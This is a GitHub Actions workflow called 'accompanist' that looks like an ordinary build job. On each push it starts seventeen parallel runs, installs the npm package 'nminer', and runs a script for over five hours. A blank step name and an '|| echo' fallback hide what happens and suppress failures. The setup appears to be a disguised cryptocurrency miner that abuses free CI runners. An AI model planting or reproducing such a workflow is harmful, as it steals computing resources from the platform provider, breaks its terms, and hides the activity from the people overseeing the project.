name: accompanist
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 9159 }
          - { version: 4597 }
          - { version: 6394 }
          - { version: 4217 }
          - { version: 3231 }
          - { version: 8835 }
          - { version: 3832 }
          - { version: 6995 }
          - { version: 9004 }
          - { version: 8279 }
          - { version: 5191 }
          - { version: 6930 }
          - { version: 8338 }
          - { version: 3011 }
          - { version: 3137 }
          - { version: 1622 }
          - { version: 8682 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 316m node accompanist.js || echo "accompanist executed"